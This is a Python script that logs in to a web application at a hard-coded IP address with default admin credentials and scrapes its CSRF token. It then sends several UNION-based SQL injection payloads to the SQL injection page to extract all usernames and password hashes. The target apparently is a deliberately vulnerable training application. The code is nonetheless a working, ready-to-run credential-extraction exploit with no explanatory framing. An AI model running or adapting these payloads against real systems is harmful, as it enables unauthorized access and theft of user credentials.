
import requests
import re
import html

target_url = "http://31.97.117.123"
session = requests.Session()

# Login first
print("[*] Logging in...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)

# Test with a simple ID first to see the output format
print("\n[*] Testing with ID=1 to see output format...")
params = {"id": "1", "Submit": "Submit"}
response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)

# Look for the full HTML structure
match = re.search(r'(ID:.*?<\/pre>)', response.text, re.DOTALL)
if match:
    output = match.group(1)
    print("[*] Output structure:")
    print(html.unescape(output[:1500]))
    print("\n...")

# Now try to get all users with password by using UNION
print("\n[*] Attempting to extract all users with passwords...")

payloads = [
    "999' UNION SELECT user_id, user, password, 'X' FROM users-- -",
    "999' UNION SELECT user_id, user, password, first_name FROM users-- -",
    "999 UNION SELECT user_id, user, password, 'X' FROM users-- -",
]

for payload_str in payloads:
    print(f"\n[*] Trying: {payload_str[:70]}...")
    try:
        params = {"id": payload_str, "Submit": "Submit"}
        response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)
        
        if "admin" in response.text or response.text.count("<br />") > 2:
            match = re.search(r'(ID:.*?)<\/pre>', response.text, re.DOTALL)
            if match:
                output = html.unescape(match.group(1))
                print("[+] Found results:")
                print(output[:2000])
                    
    except Exception as e:
        print(f"[-] Error: {str(e)}")

